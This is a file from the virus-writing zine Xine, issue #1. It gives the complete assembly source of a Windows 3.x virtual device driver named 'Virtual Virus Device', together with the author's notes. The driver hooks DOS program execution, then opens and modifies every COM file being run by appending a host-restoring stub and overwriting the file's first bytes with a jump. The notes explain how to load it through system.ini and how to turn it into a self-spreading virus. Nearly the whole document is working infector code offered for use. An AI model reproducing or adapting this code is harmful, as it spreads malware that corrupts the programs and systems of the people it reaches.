; 
;                                         /-----------------------------\
;                                         | Xine - issue #1 - Phile 006 |
;                                         \-----------------------------/
; 
; JHB presents:
; 
;         infections by VxD
; 
;   Well yes just as tsr's are to dos as VxD's to windows  they offer an
; amazing power and most probaly 90 percent will never know a VxD has been
; added.  This example shows how a VxD can modify com files and do it fast.
; To make a true virus you would need to add a method to get the vxd in
; memory. Infecting a command file and hooking the int 2f you can watch
; and wait till windows yells out "hey Look out I am loading" at this time
; you can make the vxd tell windows to load it. Another I feel may be easier
; is to modifiy the system.ini to load it.  But those are otherbridges to
; cross... 


;well lets be honest I use a source code as a frame to build this
;example, I did make the int 21 hook and the other stuff but thats
;just modified virus ideas from regular dos virii.
;to test just ad the line in the system.ini in the
;[386Enh]
;device=vvmd.386
;oh yea you need the masm5.1 and the device driver kit for windows3.X
;to assembly this if any one finds another way to assembly this please
;let me know.
;
;************************************************************************
TITLE VVD.ASM - Virtual Virus Device
;
; 
;problem if ifshlp is loaded in the config.sys windows
;refuse to loads no error just returns to the c:\   only happen on one
;system not sure why
; 
;************************************************************************

        .386p


;************************************************************************
;                             I N C L U D E S
;************************************************************************

        .XLIST
        INCLUDE VMM.Inc
        .LIST

;************************************************************************
;                V I R T U A L   D E V I C E   D E C L A R A T I O N
;************************************************************************

Declare_Virtual_Device VVD, 3, 0, VVD_Control, TSRLoad_Device_ID, \
                       Undefined_Init_Order, ,


;************************************************************************
;                  I N I T I A L I Z A T I O N   D A T A
;************************************************************************

VxD_DATA_SEG

pFn             dd      ?
VVD_RW_BUFF     db      32h dup (0)
SysFile     db  "WIN.COM"
        db  9 dup (0)
SysFileLen      dw      8

hFILE           DW      ?

NEW_JMP         DB      0E9H
Fsize           DW      ?
MARKER          DB      "V"

V_HOST          db      0c7h, 06, 00, 01          ;MOV WORD PTR [100],
FIRST_WORD      DW      ?                         ;
                DB      0C7H, 06, 02, 01          ;MOV WORD PTR [102],
SECOND_WORD     DW      ?                         ;
                DB      068H, 00, 01              ;PUSH 0100
                DB      0C3H                      ;RET
SIZE_V          DW      0010H
VxD_DATA_ENDS

;************************************************************************
;             R E A L   M O D E   I N I T I A L I Z A T I O N
;************************************************************************

VxD_REAL_INIT_SEG

BeginProc VVD_Real_Mode_Init

        xor     bx, bx                  ;nothing to do here
        xor     si, si                  ;except tell windows that
        mov     ax, Device_Load_Ok      ;everything's ok
        ret

EndProc VVD_Real_Mode_Init

VxD_REAL_INIT_ENDS

;*************************************************************************
;              D E V I C E   C O N T R O L   P R O C E D U R E
;*************************************************************************

VxD_CODE_SEG

BeginProc VVD_Control

        Control_Dispatch Device_Init, VVD_Device_Init
        Control_Dispatch Init_Complete, VVD_Init_Complete

        clc                          ; Ignore other control calls
        ret

EndProc VVD_Control

VxD_CODE_ENDS


;*************************************************************************
;                   I N I T I A L I Z A T I O N   C O D E
;*************************************************************************

VxD_ICODE_SEG

BeginProc VVD_Device_Init

        mov     eax,21H                 ;hook V86 int 21 handler
        mov     esi,OFFSET32 int_21handler
        VMMcall Hook_V86_Int_Chain
        clc                             ;say everything's clear
        ret

EndProc VVD_Device_Init

BeginProc VVD_Init_Complete

        clc                             ;say everything's clear
        ret

EndProc VVD_Init_Complete

VxD_ICODE_ENDS

VxD_CODE_SEG

;*************************************************************************
;                   V86 I N T E R R U P T   H A N D L E R S
;*************************************************************************

;*************************************************************************
;
;   int_21handler
;
;   DESCRIPTON: aTTEMPTS TO DETERMINE IF THE FILE IS A COM FILE IF SO
;               ADD SOME MARKER AT THE END
;               pass that point the com file is modified to
;               jmp to the end then return after restoring the host
;               
;
;=========================================================================
;NOTE IT APPEARS THAT ON ENTRY TO HERE EBP -> TO THE CRS (REGS STRUCTURE)
;WHILE                                 EBX -> THE VM HANDLE
;NOTE SURE IF THE EBX IS A POINTER BUT i AM ASSUMING IT IS AT THIS TIME
;TO MAKE LIFE EASIER
;SEEMS MY GUESS IS WRONG
;
;The system calls the procedure as follows:
;
;    mov     eax, Interrupt      ; number of interrupt hooked
;    mov     ebx, VM             ; current VM handle
;    mov     ebp, OFFSET32 crs   ; points to a Client_Reg_Struc
;    call    [HookProc]



BeginProc int_21handler
        cmp     [ebp.Client_AX],4b00h            ;the exec call
        jne     REFLECT_21


        Push_Client_State          ;RESTORES THE CLIENT_IP_REG AND CS
        VMMcall Begin_Nest_Exec    ;RESTORES THE CLIENT REGS  

    movzx   edx, [ebp.Client_DS]    ; get offset to file name
    shl edx, 4
    movzx   eax, [ebp.Client_DX]
    add edx, eax
    add edx, [ebx.CB_High_Linear]
        mov     [pFn], edx

        ;  if win.com  do not infect
    push    edi
        mov     edi, edx                        ; file name
    mov ecx, 128
    mov al, 0
        repne   scasb                            
    dec edi

i21_90: dec edi
    cmp byte ptr [edi], '\'
    je  short i21_100
    cmp byte ptr [edi], '/'
    je  short i21_100
    cmp byte ptr [edi], ':'
    je  short i21_100
    cmp edi, edx
    jb  short i21_100
    jmp short i21_90

i21_100:    inc edi         ; see if they match
    mov esi, offset32 [SysFile]
    movzx   ecx, [SysFileLen]
    repe    cmpsb
    pop edi
        jz      EXIT_I21                   ; win.com do not play with

        mov     eax, 3D22h                 ; open file
    VxDint  21h
        jnc     file_open
        jmp     EXIT_I21                   ;  error on open

file_open:
        MOV     word ptr [hFile],AX             ;YEA OLD SAVE FILE  
        MOV     EBX,EAX                         ;HANDLE

    mov eax, 3F00h          ; read MZ
        mov     ecx, 2                          ;assume if not MZ
        lea     edx, FIRST_WORD                ;its a com file
        VxDint  21h                             ;
        jc      EXIT_I21                        ;
        cmp     word ptr [FIRST_WORD], 5A4Dh   ;
        je      close_EXIT_I21                  ;

        mov     eax, 3F00h                      ; read next two bytes
        mov     ecx, 2                          ;assume if not MZ
        lea     edx, SECOND_WORD                ;its a com file
        VxDint  21h                             ;
        jc      EXIT_I21                        ;
        cmp     BYTE ptr [SECOND_WORD+1],"V"  ;
        je      close_EXIT_I21                  ;



        mov     eax, 4202h                      ; seek to end
    xor ecx, ecx
        mov     edx, ecx
    VxDint  21h
        jc      close_EXIT_I21

        CMP     DX,0                            ;FILE IS TOO BIG
        JNE     close_EXIT_I21                  ;GET OUT OF HERE

        DEC     EAX                             ;adjust the file size
        DEC     EAX                             ;for the jmp
        DEC     EAX                             ;
        MOV     [Fsize],AX                      ;SAVE THE FILE_SIZE

        MOV     EAX,4000H                       ;WRITE THE V_HOST
        MOV     ECX, 10H                        ;
        lea     EDX, V_HOST                     ;
        VxDint  21h                             ;

        mov     eax, 4200h                      ; seek to end
    xor ecx, ecx
        mov     edx, ecx
    VxDint  21h
        jc      close_EXIT_I21


        MOV     EAX,4000H                       ;WRITE THE  
        MOV     ECX, 4                          ;NEW JMP
        lea     EDX, NEW_JMP                    ;
        VxDint  21h                             ;


close_EXIT_I21:

        mov     bx, [hFile]                 ; close file
        mov     eax, 3E00h
    VxDint  21h
        



EXIT_I21:
        VMMcall End_Nest_Exec      ;RESTORES THE CLIENT_IP_REG AND CS
        Pop_Client_State           ;RESTORES THE CLIENT REGS


                                                  

REFLECT_21:          ;reflect interrupt to next VxD or to V86 handler
        stc
        ret

EndProc int_21handler

VxD_CODE_ENDS


        END VVD_Real_Mode_Init
